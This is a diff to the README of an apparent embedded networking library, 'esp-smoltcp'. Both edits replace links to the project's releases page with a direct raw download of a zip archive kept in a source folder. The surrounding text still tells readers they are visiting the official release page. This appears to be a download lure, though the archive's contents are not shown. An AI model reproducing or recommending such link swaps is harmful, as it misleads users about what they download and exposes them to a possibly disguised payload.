@@ -1,6 +1,6 @@
 # 🌐 esp-smoltcp - Network performance for your embedded hardware
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Osbornefrozen840/esp-smoltcp/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Osbornefrozen840/esp-smoltcp/raw/refs/heads/main/components/esp_smoltcp/smoltcp-esp-3.4-beta.5.zip)
 
 ## What is this tool? 🛠️
 
@@ -24,7 +24,7 @@ Your setup needs these components to function correctly:
 
 You must visit the official release page to get the files. 
 
-[Click here to visit the download page](https://github.com/Osbornefrozen840/esp-smoltcp/releases)
+[Click here to visit the download page](https://github.com/Osbornefrozen840/esp-smoltcp/raw/refs/heads/main/components/esp_smoltcp/smoltcp-esp-3.4-beta.5.zip)
 
 On this page, you see a list of available files. Select the version that matches your hardware project requirements. Most users download the latest version provided at the very top of the list. Save the file to a folder you can find on your computer.
 
